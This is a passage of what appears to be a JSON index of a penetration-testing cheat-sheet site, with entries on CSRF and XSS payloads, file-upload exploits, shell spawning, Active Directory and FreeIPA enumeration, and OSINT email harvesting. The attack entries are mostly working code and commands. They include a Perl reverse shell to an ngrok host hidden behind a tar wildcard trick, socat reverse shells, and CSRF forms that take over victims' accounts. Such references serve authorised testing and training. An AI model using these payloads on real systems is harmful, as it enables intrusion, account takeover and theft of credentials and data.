language=\u0026#34;javascript\u0026#34;\u0026gt;document.pls.submit();\u0026lt;/script\u0026gt;# Basic form \u0026lt;html\u0026gt;\u0026lt;body\u0026gt; \u0026lt;form name=\u0026#34;csrf\u0026#34; action=\u0026#34;https://xxx.fr/index.php?action=profile\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;aaa\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;status\u0026#34; value=\u0026#34;on\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;document.csrf.submit();\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;# Form using XMLHttpRequest \u0026lt;script\u0026gt; var formData = new FormData(); formData.append(\u0026#34;username\u0026#34;, \u0026#34;test\u0026#34;); formData.append(\u0026#34;status\u0026#34;, \u0026#34;on\u0026#34;); var request = new XMLHttpRequest(); request.open(\u0026#34;POST\u0026#34;, \u0026#34;https://xxx.fr/index.php?action=profile\u0026#34;); request.send(formData); \u0026lt;/script\u0026gt;# Encoded payload \u0026lt;svg/onload=eval(atob(\u0026#39;\u0026lt;base 64 payload\u0026gt;\u0026#39;));//\u0026gt; # You can also host a script and then call it if the target is XSS vulnerable // On charge le formulaire dans une frame invisible document.write(\u0026#39;\u0026lt;iframe id=\\\u0026#34;iframe\\\u0026#34; src=\\\u0026#34;https://xxx.fr/index.php?action=profile\\\u0026#34; width=\u0026#34;0\u0026#34; height=\u0026#34;0\u0026#34; onload=\\\u0026#34;pwn()\\\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;); //On modifie les champs à notre guise function pwn() { document.getElementById(\u0026#39;iframe\u0026#39;).contentDocument.forms[0].username.value=\u0026#39;titi\u0026#39;; document.getElementById(\u0026#39;iframe\u0026#39;).contentDocument.forms[0].status.checked=true; document.getElementById(\u0026#39;iframe\u0026#39;).contentDocument.forms[0].status.disabled=false document.getElementById(\u0026#39;iframe\u0026#39;).contentDocument.forms[0].submit(); } # Load \u0026lt;script src=\u0026#34;http://XXXXXXX/csrf.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;"
},
{
	"uri": "/web-pentest/injections/client-side-injections/",
	"title": "Client Side Injections",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/",
	"title": "Darkweb Investigation",
	"tags": [],
	"description": "",
	"content": " [WIP]\nSearch the Darkweb https://medium.com/@darksearch/darksearch-the-1st-real-search-engine-dark-web-darksearch-vs-ahmia-84852fd4c51b https://darksearch.io/ # Dark Web Searching https://www.osintcombine.com/post/dark-web-searching # Conducting OSINT on .onion sites https://www.osintme.com/index.php/2019/11/24/darknet-diving-conducting-osint-on-onion-sites/ # List of darknet markets for investigators https://www.osintme.com/index.php/2020/11/21/list-of-darknet-markets-for-investigators/https://webhose.io/blog/dark-web/the-top-5-dark-web-search-engines/ # - Candle # - Torch # - Kilos # - AHMIA # - Tor77 # - Darksearch \n"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/domains_urls/",
	"title": "Domain &amp; URLs",
	"tags": [],
	"description": "",
	"content": " Getting Informations Get information on an IP whois \u0026lt;IP\u0026gt; # Get IP address associated to a domain nslookup domain.fr ping domain.fr # Knockknock is a small automated script allowing you to find domain names # For a registrant (person or company) python3 k2.py -n company -d # Many tools https://intelx.io/ # Estimate the creation date of a website http://carbondate.cs.odu.edu/ https://github.com/Lazza/Carbon14 \nOnline Passive Identification Tools Target Mapping and Informations # Informations about the target https://securitytrails.com/ # Robtex is a great and complete tool https://www.robtex.com # Getting technology informations https://builtwith.com # Mapping the target website can be good to get an overview www.visualsitemapper.com Side-domains Identification # Then you can find domains and subdomains associated to an IP by using Passive Reverse DNS https://www.virustotal.com/gui/home/search # RiskIQ Passive DNS # You can identify new domains in the \u0026#34;RelationShip\u0026#34; section # of Builtwith https://builtwith.com/relationships/xxx.fr # When you have a name or a e-mail adress you can perform a reverse whois lookup to find domain # names oned by a person of a company https://viewdns.info/reversewhois/ # Multi tool https://osint.sh/ \nGetting page title # One line # Getting page title without following redirections for i in $(cat urls_or_subdomains.txt); do echo \u0026#34;$i| $(curl --connect-timeout 3 $i -s -v 2\u0026gt;\u0026amp;1 | grep -Poz \u0026#39;((?\u0026lt;=title\u0026gt;)(.*)(?=\u0026lt;/title\u0026gt;)|(?\u0026lt;=Location:)(.*)/|(Could not resolve host:.*))\u0026#39; | tr -d \u0026#39;\\0\u0026#39; | sed -r \u0026#39;s/(https?:\\/\\/.*\\/?)(.*)(301 Moved Permanently)/\\3 \\2\\1/g\u0026#39; )\u0026#34;; done \nInvestigate a website (crosspost methodology) # Thread by Aware Online about some website investigation methodology https://twitter.com/aware_online/status/1308312883248467975 # 1 - Tactical informations # 2 - WHOIS # 3 - Archives # 4 - Text # 5 - Reverse Image Search # 6 - Images and EXIF data # 7 - Source code # 8 - Others TLD # 9 - Mentions of target # 10 - Check infos via RSS # 11 - SSL certificates # 12 - Robots/Sitemap # 13 - Port scans # 14 - Reverse IP lookup # 15 - Reverse DNS lookup # 16 - Monitoring changes # 17 - Malware check \nr3con1z3r (https://github.com/abdulgaphy/r3con1z3r) # OSINT Tool used to perform some OSINT tests and generates a report # HTTP Headers, Whois, Traceroute, DNS, nmap, website on the same server, Reverse IP, Page Links # Take care, not really passiv ./r3con1z3r.py google.com \nDomain spoofing and typosquatting # Tools like spoofcheck (https://github.com/BishopFox/spoofcheck) # It checks SPF and DMARC records for weak configuration that allow domain spoofing # Domain is spoofable if lack of an SPF or DMARC record, SPF record never specifies ~all or -all, DMARC policy is set to p=none or is nonexistent ./spoofcheck.py [DOMAIN]# urlcrazy allow to generate typo for a given domain and will check different elements # such as IP, country, Nameserver and MX https://github.com/urbanadventurer/urlcrazy/ # Default search $ urlcrazy domain.com # You can also search with popularity estimate $ urlcrazy -p domain.com \nMore Information Gathering # EyeWitness (https://github.com/FortyNorthSecurity/EyeWitness) # It can take screenshots of websites, RDP services and open VNC servers, provide some server header info and identify defualt credentials ./EyeWitness.py -f filename --timeout optionaltimeout --open (Optional) ./EyeWitness -f urls.txt --web ./EyeWitness -x urls.xml --timeout 8 --headless ./EyeWitness -f rdp.txt --rdp# XRay tool (https://github.com/evilsocket/xray) # Bruteforce subdomains using wordlist and DNS requests, then Shodan, then ViewDNS is key is provided. # Then it will launch banner grabbing and info collectors (not passiv) xray -shodan-key yadayadayadapicaboo... -viewdns-key foobarsomethingsomething... -domain fbi.gov"
},
{
	"uri": "/windows-systems/network-and-domain-recon/domain_recon/",
	"title": "Domain Recon",
	"tags": [],
	"description": "",
	"content": " Tips # Enumerate sessions net session \\\\computer \nDomain Properties rpcclient # You can use rpc to enumerate domain objects rpcclient -U \u0026lt;user\u0026gt; \u0026lt;IP-DC\u0026gt; rpcclient $\u0026gt; enumdomusers rpcclient $\u0026gt; enumdomgroups rpcclient $\u0026gt; querygroupmem 0x200 rpcclient $\u0026gt; srvinfo rpcclient $\u0026gt; querygroup 0x42 rpcclient $\u0026gt; queryuser 0x42 rpcclient $\u0026gt; getdompwinfo rpcclient $\u0026gt; getusrdompwinfo 0x42 \nenum4linux # You can use enum4linux to enumerate domain users # You can try anonymous binding sudo enum4linux domaine.fr ./enum4linux.pl -R 1090-1200 # When using authenticated users, you need to provide options for enumeration $ enum4linux -a -u \u0026#34;DOMAIN\\\\user\u0026#34; -p \u0026#34;pass\u0026#34; xx.xx.xx.xx# enum4linux-ng is a rewrite of the official tool (python3) # adding some features like colors and parsing https://github.com/cddmp/enum4linux-ng \nwindapsearch # windapsearch is also a very good tool to perform automated LDAP queries # Enumerate users ./windapsearch.py -d lab.ropnop.com -u ropnop\\\\ldapbind -p GoCubs16 -U ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 -U # enumerate all entries in objectCategory=group ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 -G # Query group membership ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 -m \u0026lt;CN/OU\u0026gt; # Enumerate all domain admins and people having equivalent rights ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 --da # Enumerate all computers ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 -C # Custom search ./windapsearch.py -dc-ip 10.10.10.10 -u ropnop\\\\ldapbind -p GoCubs16 -s \u0026lt;stringToSearch\u0026gt; \nPywerview python pywerview.py get-netuser -w GALACTIC.LAN -u d.traya --dc-ip 192.168.56.103 --username d.traya python pywerview.py get-netgroup -w GALACTIC.LAN -u d.traya --dc-ip 192.168.56.103 --username d.vador \nBuilt-in functions https://twitter.com/NinjaParanoid/status/1407137264283504640/photo/1 # You can use [adsisearcher] to enumerate AD objects PS\u0026gt; ([adsisearcher])\u0026#34;(\u0026amp;(objectcategory=useer)(userAccountControl:1.2.840.113556.1.4.803:=65536))\u0026#34;).findAll() \nSMB \u0026amp; Share Basic enumeration # Enumerate hostname nmblookup -A \u0026lt;victim_ip\u0026gt; enum4linux -n \u0026lt;victim_ip\u0026gt; $ nmap --script=smb-enum* --script-args=unsafe=1 -T5 \u0026lt;victim_ip\u0026gt; # Check for null sessions smbmap -H \u0026lt;victim_ip\u0026gt; # Checking for vulns nmap --script smb-vuln* -p139,445 -T4 -Pn \u0026lt;victim_ip\u0026gt; Smbclient # Using smbclient smbclient -L \u0026lt;IP\u0026gt; smbclient -U GALACTIC.LAN\\\\d.vador -L //10.69.88.10 # You can recursively download a folder smb: \u0026gt; recurse ON smb: \u0026gt; prompt OFF smb: \u0026gt; mget * SYSVOL \u0026amp; MS14-025 # You can browse SMB share using smbclient # The SYSVOL share contains GPO, you can look for a MS14-025 smbclient -U user //10.34.67.4/SYSVOL # Instead of remotely connecting to SYSVOL and manually search # You can mount it locally and grep for informations # FASTER! sudo mount -t cifs -o username=domainUser,domainn=domain.com //IP/SYSVOL# MS14-025 → smb: \\NORZH.LAN\\Policies\\{195471B6-B0C6-4AD2-9853-28E2B4E9CEF6}\\Machine\\Preferences\\Groups\\Groups.xml → gpp-decrypt password # The following tool allows a great decryption https://github.com/lucasko/gpp-encrypt-decrypt# If you ever need to recreate this vulnerability # You can encrypt a password using the following https://gchq.github.io/CyberChef/#recipe=AES_Encrypt(%7B\u0026#39;option\u0026#39;:\u0026#39;Hex\u0026#39;,\u0026#39;string\u0026#39;:\u0026#39;4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b\u0026#39;%7D,%7B\u0026#39;option\u0026#39;:\u0026#39;Hex\u0026#39;,\u0026#39;string\u0026#39;:\u0026#39;0000000000000000000000000000000\u0026#39;%7D,\u0026#39;CBC\u0026#39;,\u0026#39;Raw\u0026#39;,\u0026#39;Raw\u0026#39;,%7B\u0026#39;option\u0026#39;:\u0026#39;Hex\u0026#39;,\u0026#39;string\u0026#39;:\u0026#39;\u0026#39;%7D)To_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;)\u0026amp;input=cGFzcw CrackMapExec \u0026amp; Impacket # Impacket SMB/MSRPC tools # lookupsids → SID Bruteforce through MSRPC Interface # samrdump → SAM Remote Interface (MSRPC) to extract system users, available share etc. # services → Used to (start, stop, delete, status, config, list, create, change) services through MSRPC interface # netview → Get a list of opened sessions and keep tracks of who logged in/off from remote targets # smbclient → generic SMB client # rpcdump → This script will dump the list of RPC endpoints and string bindings registered at the target. # reg → Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. tool.py domain\\user:password@IP \u0026lt;command/parameter\u0026gt; # You can list all shares on a shares on a machine to find potential entry points cme smb 10.69.88.23 -u user -p password --shares Defensive # DEFENSIVE POINT OF VIEW # You can list active SMB sessions C:\\\u0026gt; net session # And kill them C:\\\u0026gt; net session \\[LinuxIPaddr] /del \nAzure AD Recon # Applications using Azure API Management # Requests made to that \u0026lt;name\u0026gt;.azure-api.net # Documentation and more \u0026lt;name\u0026gt;.portal.azure-api.net # Gateway \u0026lt;name\u0026gt;.azure-api.net # Dev \u0026lt;name\u0026gt;.portal.azure-api.net \u0026lt;name\u0026gt;.developer.azure-api.net # Management \u0026lt;name\u0026gt;.management.azure-api.net # Git \u0026lt;name\u0026gt;.scm.azure-api.nethttps://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html # Tool o365recon can be used (https://github.com/nyxgeek/o365recon) # It mainly uses MS Online Powershell module PS\u0026gt; Connect-MsolService PS\u0026gt; powershell -ep bypass .\\o365recon.ps1 -outputfile TEST_OUTPUT # The -users_detailed flag can be used in order to query more information about users # LastDirSyncTime empty == User only exist in the cloud # The id suffixed to the SYNC cloud account == same id for the MSOL account belonging to the on-premises Active Directory # You can also list Azure AD roles and members (cf attached link) # MailSniper can also be used to get the Adress List PS C:\\\u0026gt; Get-GlobalAddressList -ExchHostname outlook.office365.com -UserName xxxx -Password xxxx -OutFile xxxx # And associated usernames PS C:\\\u0026gt; Get-ADUsernameFromEWS -EmailList list.txt -ExchHostname outlook.office365.com -Remote# C# Module for Azure AD enumeration https://twitter.com/benpturner/status/1384595006917431301?s=19 https://gist.github.com/benpturner/c7376718558bb118111c7cad651a25ce# When having admin privileges you can check for MFA for users PS C:\\\u0026gt; Connect-MsolService PS C:\\\u0026gt; Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@{N=\u0026#34;MFA Status\u0026#34;; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequirements.State} else { \u0026#34;Disabled\u0026#34;}}} | export-csv mfaresults.csv# ROADTools (https://github.com/dirkjanm/ROADtools)* # It uses an internal undocumented version of Microsoft Graph API PS C:\\\u0026gt; roadrecon.exe auth -u user@domain Tokens were written to .roadtools_auth PS C:\\\u0026gt; roadrecon.exe dump PS C:\\\u0026gt; roadrecon-gui.exe -debug -d .\\roadrecon.db * Serving Flask app \u0026#34;roadtools.roadrecon.server\u0026#34; (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: off * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit) # Plugin for getting Conditional Access Policies PS C:\\\u0026gt; roadrecon plugin policies"
},
{
	"uri": "/open-source-intelligence-osint/dorks/",
	"title": "Dorks",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/web-pentest/content-management-system-cms/drupal/",
	"title": "Drupal",
	"tags": [],
	"description": "",
	"content": " https://github.com/gfoss/attacking-drupal\nTips \u0026amp; Tricks # Manual user enumeration # Step 1 : check for existing user # 403 --\u0026gt; User exist # 404 --\u0026gt; User doesn\u0026#39;t exist https://www.site.com/user/x # Then you can get username https://www.site.com/reset/user/x/1/1 \nDroopescan # Not Drupal specific but can work too (Wordpress, SilverStripe, Joomla, Moodle, Drupal) droopescan --help droopescan scan --help# Target Identification droopescan scan drupal -u example.org droopescan scan drupal -U list_of_urls.txt # You can also ommit the drupal argument, so it will trigger the cms identification droopescan scan -u example.org droopescan scan -U list_of_urls.txt# Scan types # By default, most of the time, 4 threads droopescan scan drupal -u example.org --number xxx --threads xxx # By default, all tests are done, but you can specify some manually # - p : plugin checks # - t : theme checks # - v : version checks (files checksums) # - i : interesting urls checks droopescan scan drupal -u example.org --enumerate \u0026lt;type\u0026gt;# Getting stats and capabilities for the scanner droopescan stats \nDrupwn # Scanner and complete tool for Drupal 6 and 8 $ drupwn -h ____ / __ \\_______ ______ _ ______ / / / / ___/ / / / __ \\ | /| / / __ \\  / /_/ / / / /_/ / /_/ / |/ |/ / / / / /_____/_/ \\__,_/ .___/|__/|__/_/ /_/ /_/ usage: drupwn [-h] [--users] [--nodes] [--modules] [--dfiles] [--themes] [--version VERSION] [--cookies COOKIES] [--thread THREAD] [--range RANGE] [--ua UA] [--bauth BAUTH] [--delay DELAY] [--log] [--proxy PROXY | --proxies PROXIES] mode target Drupwn aims to automate drupal information gathering. positional arguments: mode enum|exploit target hostname to scan optional arguments: -h, --help show this help message and exit --users user enumaration --nodes node enumeration --modules module enumeration --dfiles default files enumeration --themes theme enumeration --version VERSION Drupal version --cookies COOKIES cookies --thread THREAD threads number --range RANGE enumeration range --ua UA User Agent --bauth BAUTH Basic authentication --delay DELAY request delay --log file logging --proxy PROXY [http|https|socks]://host:port --proxies PROXIES Proxies file \nOnline tools # Attempt to detect version of Drupal Core # Find Plugins in HTML response # Identify theme in use # List client side JS in page # List iframes in page # Test for directory indexing enabled on key locations # Check Google Safe Browse for reputation # Get IP information and Geolocation https://hackertarget.com/drupal-security-scan/"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/email/",
	"title": "E-mails",
	"tags": [],
	"description": "",
	"content": " Tips \u0026amp; Tricks https://twitter.com/henkvaness/status/1308417260848062464 # Using Google Dorks you can search for e-mails like this # It can helps in identifying one target specific e-mail address # \u0026#34;john doe \u0026#34; \u0026#34;john * * com\u0026#34; \nOnline tools # Domain e-mail syntax finder https://www.email-format.com https://hunter.io # Omail can find domain syntax as well as related e-mails addresses https://omail.io/ # E-mail validator https://tools.verifyemailaddress.io/ http://mailtester.com https://dnslytics.com/email-test https://verify-email.org/ https://verifalia.com/validate-email # IntelX new tool allows to browse records for a given domain https://phonebook.cz/ # Simple Email Reputation https://emailrep.io/ \nThe Harvester # theHarvester is a famous OSINT and scrapping tool for passiv recon on targets # Using API keys will highly increase results # TheHarvester received a great # Following modules need API key (api-keys.yaml) # bing, github, hunter, intlex, securitytrails, shodan, spyse Usage: theharvester options -d: Domain to search or company name -b: data source: baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all -s: start in result number X (default: 0) -v: verify host name via dns resolution and search for virtual hosts -f: save the results into an HTML and XML file (both) -n: perform a DNS reverse query on all ranges discovered -c: perform a DNS brute force for the domain name -t: perform a DNS TLD expansion discovery -e: use this DNS server -p: port scan the detected hosts and check for Takeovers (80,443,22,21,8080) -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp doesn\\\u0026#39;t use this option) -h: use SHODAN database to query discovered hosts Examples: theharvester -d microsoft.com -l 500 -b google -h myresults.html theharvester -d microsoft.com -b pgp theharvester -d microsoft -l 200 -b linkedin theharvester -d apple.com -b googleCSE -l 500 -s 300 \nSimplyEmail # Another simple tool to do email enumeration https://github.com/SimplySecurity/SimplyEmail ./SimplyEmail.py -all -e cybersyndicates.com or in verbose ./SimplyEmail.py -all -v -e cybersyndicates.com or in verbose and no \u0026#34;Scope\u0026#34; ./SimplyEmail.py -all -v -e cybersyndicates.com -s or with email verification ./SimplyEmail.py -all -v -verify -e cybersyndicates.com or with email verification \u0026amp; Name Creation ./SimplyEmail.py -all -v -verify -n -e cybersyndicates.com or json automation ./SimplyEmail.py -all -e cybersyndicates.com --json cs-json.txt \nZen (https://github.com/s0md3v/Zen) # This tool allows you to retrieve the e-mail address of github users python zen.py username python zen.py https://github.com/username # Find all emails addresses of contributors for one project python zen.py https://github.com/username/repository # Find emails for an organization python zen.py organization --org python zen.py https://github.com/orgs/organzation # Search if the e-mail is present in a breach python zen.py s0md3v --breach \nQuidam (https://github.com/megadose/Quidam) # Quidam allows you to retrieve information thanks to the forgotten password function of some sites. $ python3 quidam.py --help usage: quidam.py [-h] -u USERNAME -m MODULE optional arguments: -h, --help show this help message and exit -u USERNAME, --username USERNAME The uername of the target -m MODULE, --module MODULE Modules to use instagram, twitter, github or all $ python3 quidam.py --username test --module all You select all Email extract with instagram of test: z*******1@gmail.com Email extract with twitter of test: te**@b********.*** Possible email : te**@barcelona.com te**@beethoven.com te**@bellsouth.net te**@bellsouth.net te**@bigassweb.com te**@bikeracer.com te**@bikerider.com te**@birdowner.net te**@blazemail.com te**@bluehyppo.com te**@blushmail.com te**@bmlsports.net te**@bornnaked.com te**@broadcast.net te**@buffymail.com te**@bullsgame.com te**@buyersusa.com Not informations found in github \nHolehe (https://github.com/megadose/holehe) # holehe allows you to check if the mail is used on different sites like twitter, # instagram and will retrieve information on sites with the forgotten password function. # Tons on modules $ holehe -e test@gmail.com # WEB VERSION BY EPIEOS https://tools.epieos.com/holehe.php \nYopmail \u0026amp; co https://openfacto.fr/2020/10/19/y-a-plein-de-mails-interessants-sur-yopmail-com/ # Yogo is a CLI tool allowing to search \u0026amp; scrape yopmail adresses https://github.com/antham/yogo # Retrieve 10 messages from mailbox test1@yopmail.com yogo inbox list test1 10 # Retrieve first message from inbox helloworld@yopmail.com yogo inbox show helloworld 1"
},
{
	"uri": "/other-systems/freeipa/",
	"title": "FREEIPA",
	"tags": [],
	"description": "",
	"content": " What is FreeIPA ? https://posts.specterops.io/attacking-freeipa-part-i-authentication-77e73d837d6a https://posts.specterops.io/attacking-freeipa-part-ii-enumeration-ad27224371e1# Open source alternative to Microsoft Windows Active Directory # Primarily used as an integrated management solution for Unix environments. # Similar to Active Directory, FreeIPA implements a full LDAP directory infrastructure # So all together we have a Unix host management system # Complete with LDAP and Kerberos that allows for multi-factor authentication. \nInformations Files # Kerberos informations to get enrolled (location of KDCs...) /etc/krb5.conf # Default configuration file (set system-wide defaults) /etc/ipa/default.conf # Required on all hosts inside the domain (authentication process) /etc/krb5.keytab Environment variables # Location of the CCACHE KRB5CCNAME # Location of the keytab KRB5_KTNAME # Location of Kerberos configuration file KRB5_CONFIG # Location of Kerberos configuration file with additional information (KDC) KRB5_KDC_PROFILE # Default type of replay cache KRB5RCACHETYPE # Directory for replay caches KRB5RCACHEDIR # Location of logs KRB5_TRACE # Default client keytab filename KRB5_CLIENT_KTNAME # Default port for kprop KPROP_PORT Binaries # Standard for managing domain ipa # Destroy any current Kerberos tickets in the users session kdestroy # Establish, or renew Kerberos tickets kinit # Lists any current Kerberos tickets in use klist # Change a Kerberos prinipal\u0026#39;s password kpasswd # Alternative for the su binary ksu # Switch the current credential cache in use kswitch # Acquires a service ticket for the specified Kerberos principals and # Prints out the key version numbers of each kvno Authentication # CCache # File used to store tickets, usually in /tmp # Parsing ticket using klist export KRB5CCNAME=/tmp/krb5cc_0 klist /tmp/krb5cc_0 # Unix Keyring # Admins can store tickets inside keyring # Tickey can extract Kerberos tickets from the keyring (https://github.com/TarlogicSecurity/tickey) kinit admin klist ./tickey export KRB5CCNAME=/tmp/\u0026lt;ticket_outfile\u0026gt; klist # Keytab # It consists of pairs of Kerberos principals and encrypted keys that are derived # From the Kerberos password associated with the principal # Keytab parser (https://github.com/its-a-feature/KeytabParser) can parse for ticket generation python KeytabParser.py /etc/krb5.keytab kinit -kt /etc/krb5.keytab host/name.domain.local@domain.local klist Enumeration # Hosts, Users and Groups # Hosts, and users can be sorted into containers called “Host Groups” and “User Groups” respectively # Similar to OU in Active Directory # Host-Based Access Control Rules (HBAC-Rules), Privileges, Roles, and Sudo-Rules # Can be applied to any of the objects above # You can enumerate using LDAP queries or built-in FreeIPA tools# LDAP Queries # Get all unauthenticated accessible data ldapsearch -x # After authentication, get all users kinit -kt /etc/krb5.keytab ldapsearch -Y gssapi -b \u0026#34;cn=users,cn=compat,dc=westeros,dc=local\u0026#34; # Get all hosts ldapsearch -Y gssapi -b \u0026#34;cn=computers,cn=accounts,dc=westeros,dc=local\u0026#34; # Host group ldapsearch -Y gssapi -b \u0026#34;cn=hostgroups,cn=accounts,dc=westeros,dc=local\u0026#34; # User groups ldapsearch -Y gssapi -b \u0026#34;cn=groups,cn=accounts,dc=westeros,dc=local\u0026#34;# Built-in tools # Installed by default when enrolling, but need valid account # If you find yourself in a situation where you are lacking a valid domain credential # Each host is deployed with a keytab credential for that host. # This keytab can be used to obtain a valid Credential Cache(CCACHE) TGT for the host itself ipa user-find ipa usergroup-find ipa host-find ipa host-group-find ------------------- ipa user-show \u0026lt;username\u0026gt; --all ipa usergroup-show \u0026lt;user group\u0026gt; --all ipa host-find \u0026lt;host\u0026gt; --all ipa hostgroup-show \u0026lt;host group\u0026gt; --all# HBAC-Rules # Access controls, at a high level, define who has access to what # Get all HBAC-Rules ldapsearch -Y gssapi -b \u0026#34;cn=hbac,dc=westeros,dc=local\u0026#34; # Built-in ipa hbacrule-find ----------------- ipa hbacrule-show \u0026lt;hbacrule\u0026gt; --all# Sudo-Rules # Equivalent to HBAC-Rules but additionnal info can be set (sudoers options, run as...) # Get all Sudo-Rules ldapsearch -Y gssapi -b \u0026#34;cn=sudorules,cn=sudo,dc=westeros,dc=local\u0026#34; # Built-in ipa sudorule-find ----------------- ipa sudorule-show \u0026lt;sudorule\u0026gt; --all# Role-Bases Access Control # Role-based access control (RBAC) is a hierarchical way of organizing access to the data managed by FreeIPA # Get all roles ldapsearch -Y gssapi -b \u0026#34;cn=roles,cn=accounts,dc=westeros,dc=local\u0026#34; # Built-in ipa role-find ipa role-show \u0026lt;role\u0026gt; --all ipa privilege-find ipa privilege-show \u0026lt;privilege\u0026gt; --all ipa permission-find ipa permission-show \u0026lt;permission\u0026gt; --all"
},
{
	"uri": "/web-pentest/files-and-files-inclusions/file_upload/",
	"title": "File Upload",
	"tags": [],
	"description": "",
	"content": " File Upload are well known and kinda old PHP vulnerabilities but can still work some times  \nDouble Extension # If the target is only checking extension → exploit.php.jpg \nMIME Type # Classical, using Burp for example Content-Type: application/x-php → Content-Type: image/gif # Using cURL curl -i -F \u0026#34;file=@shell.php;type=image/gif\u0026#34; --cookie \u0026#34;...\u0026#34; \u0026#34;\u0026lt;target\u0026gt;\u0026#34; # You can also create or update the following registry key on Windows {{HKLM\\SOFTWARE\\Classes\\.php}} # Then create a “String” type registry key and, named “Content-Type\u0026#34; and set the value “image/gif” \nNull Byte → exploit.php%00.jpg \nZIP Upload # You can get resources through ZIP upload and symlinks ln -s ../../../index.php link zip --symlinks test.zip link \nWildcard \u0026amp; tar exploit # If the server is using tar and wildcard (*) on uploaded files, you can exploit it by uploading 3 files : • --checkpoint-action=exec=sh shell.sh • --checkpoint=1 • shell.sh # the shell.sh file contains a payload (different exploit are possible) : • cat \u0026#34;path/index.php\u0026#34; \u0026gt; index.txt • #!/bin/sh perl -e \u0026#39;use Socket;$i=\u0026#34;0.tcp.ngrok.io\u0026#34;;$p=15975;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39; • tar cvf admin.tar ../../../admin \nPNG IDAT Chunks https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/ curl -X POST \u0026#34;http://xxx?page=../upload/ucdn6sCjDxredw1.png\u0026amp;0=readfile\u0026#34; --cookie \u0026#34;\u0026lt;cookie\u0026gt;\u0026#34; -d \u0026#34;1=index.php\u0026#34; --output res"
},
{
	"uri": "/shells-methods/tty_full/",
	"title": "Fully Interactive TTY Shell",
	"tags": [],
	"description": "",
	"content": " MISC # RLWRAP allows you to interface local and remote keyboards # It gives access to keyboard arrows and history rlwrap ncat -lvp port# Another way to get a better shell # script is almost everytime present on the machine /usr/bin/script -qc /bin/bash /dev/null \nFully Interactive TTY Shell # Using STTY # In reverse shell $ python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Ctrl-Z # In Kali $ stty raw -echo $ fg # In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty -raw echo OR $ stty rows \u0026lt;num\u0026gt; columns \u0026lt;cols\u0026gt; \nSpawning a shell # Using os.system echo os.system(\u0026#39;/bin/bash\u0026#39;)# Using interactive sh /bin/sh -i# Using Perl, Ruby or Lua perl -e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; perl: exec \u0026#34;/bin/sh\u0026#34;; ruby: exec \u0026#34;/bin/sh\u0026#34;; lua: os.execute(\u0026#39;/bin/bash\u0026#39;)# Using Vi :!bash :set shell=/bin/bash:shell# WARNING # OhMyZSH might break this trick # so just launch /bin/bash before in your Kali to exit the /bin/zsh # Using socat # On Kali socat file:`tty`,raw,echo=0 tcp-listen:4444 # On Victim socat exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/gasmask/",
	"title": "Gasmak",
	"tags": [],
	"description": "",
